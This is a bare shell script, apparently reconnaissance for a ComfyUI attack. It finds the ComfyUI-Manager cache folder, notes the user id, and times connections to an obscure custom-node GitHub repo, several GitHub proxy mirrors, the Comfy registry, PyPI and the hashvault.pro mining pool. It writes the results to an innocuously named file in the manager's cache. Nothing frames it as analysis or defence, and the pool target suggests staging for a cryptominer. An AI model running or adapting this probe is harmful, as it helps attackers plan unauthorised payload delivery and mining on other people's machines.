f=$(ls -d /ComfyUI/user/default/ComfyUI-Manager/cache 2>/dev/null || ls -d /*/user/default/ComfyUI-Manager/cache 2>/dev/null | head -1)
[ -z "$f" ] && f=/tmp
{ echo "start $(date -u +%T) uid=$(id -u)"; for u in \
 https://raw.githubusercontent.com/dongsuju/comfynode-hk41h/main/install.py \
 https://github.com/dongsuju/comfynode-hk41h \
 https://codeload.github.com/dongsuju/comfynode-hk41h/tar.gz/refs/heads/main \
 https://gitclone.com/github.com/dongsuju/comfynode-hk41h \
 https://ghproxy.com/https://github.com/dongsuju/comfynode-hk41h \
 https://gh-proxy.com/https://github.com/dongsuju/comfynode-hk41h \
 https://registry.comfy.org/api/v1/nodes \
 https://pypi.org/simple/ \
 https://pool.hashvault.pro/ \
 https://hashvault.pro/ ; do
  echo "$u $(curl -s -o /dev/null -m 15 -w '%{http_code} %{time_total}' "$u" 2>&1)"
 done; echo "end"; } > "$f/hk41_probe.txt" 2>&1
